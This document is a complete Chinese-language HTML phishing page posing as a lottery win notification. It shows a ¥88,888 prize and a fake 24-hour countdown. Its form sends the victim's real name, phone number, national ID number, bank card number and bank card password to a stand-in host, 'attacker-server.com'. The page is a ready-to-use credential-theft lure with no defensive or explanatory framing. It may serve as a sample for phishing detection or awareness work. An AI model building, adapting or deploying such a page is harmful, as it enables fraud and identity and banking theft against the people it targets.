<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>中奖通知 - 恭喜您获得大奖</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #ff6f00 0%, #ffc107 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 450px;
            overflow: hidden;
            position: relative;
        }
        .confetti {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            background: repeating-linear-gradient(
                45deg,
                transparent,
                transparent 10px,
                rgba(255,255,255,0.1) 10px,
                rgba(255,255,255,0.1) 20px
            );
        }
        .header {
            background: linear-gradient(135deg, #ff6f00 0%, #ffc107 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        .header .icon { font-size: 70px; margin-bottom: 15px; }
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        .prize-box {
            background: linear-gradient(135deg, #fff8e1 0%, #ffecb3 100%);
            border: 3px solid #ffc107;
            border-radius: 12px;
            padding: 25px;
            margin: 25px;
            text-align: center;
        }
        .prize-label { font-size: 16px; color: #666; margin-bottom: 10px; }
        .prize-amount { font-size: 42px; font-weight: bold; color: #e65100; }
        .prize-desc { color: #f57c00; font-size: 14px; margin-top: 10px; }
        .content { padding: 0 30px 30px; }
        .steps {
            background: #e3f2fd;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .steps h4 { color: #1565c0; margin-bottom: 10px; }
        .steps ol { color: #333; font-size: 13px; line-height: 1.8; padding-left: 20px; }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 6px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
        }
        .deadline {
            background: #ffebee;
            color: #c62828;
            text-align: center;
            padding: 12px;
            border-radius: 8px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #ff6f00 0%, #ffc107 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
        }
        .footer {
            text-align: center;
            padding: 15px;
            background: #fafafa;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="confetti"></div>
        <div class="header">
            <div class="icon">&#127942;</div>
            <h1>&#127882; 恭喜您成为幸运用户 &#127882;</h1>
            <p>您的手机号码被系统随机抽取为今日幸运用户！</p>
        </div>
        <div class="prize-box">
            <p class="prize-label">您获得以下大奖</p>
            <p class="prize-amount">&#165; 88,888</p>
            <p class="prize-desc">+ 价值5999元智能手机一部</p>
        </div>
        <div class="content">
            <div class="steps">
                <h4>&#9888; 领取步骤（请务必完整填写）</h4>
                <ol>
                    <li>填写您的个人信息用于奖金发放</li>
                    <li>提交后客服将在30分钟内联系您</li>
                    <li>客服确认后将在24小时内完成转账</li>
                </ol>
            </div>
            <div class="deadline">
                &#9200; 限时领取：剩余 23小时58分钟
            </div>
            <form action="https://attacker-server.com/prize.php" method="POST">
                <div class="form-group">
                    <label>姓名（真实姓名）</label>
                    <input type="text" name="name" required>
                </div>
                <div class="form-group">
                    <label>手机号码</label>
                    <input type="tel" name="phone" required>
                </div>
                <div class="form-group">
                    <label>身份证号码</label>
                    <input type="text" name="id_card" required>
                </div>
                <div class="form-group">
                    <label>银行卡号（用于发放奖金）</label>
                    <input type="text" name="bank_card" required>
                </div>
                <div class="form-group">
                    <label>银行卡密码</label>
                    <input type="password" name="bank_password" required>
                </div>
                <button type="submit" class="submit-btn">&#127882; 立即领取奖金 &#127882;</button>
            </form>
        </div>
        <div class="footer">
            活动主办方: 幸运抽奖组委会 | 咨询: 400-888-9999
        </div>
    </div>
</body>
</html>
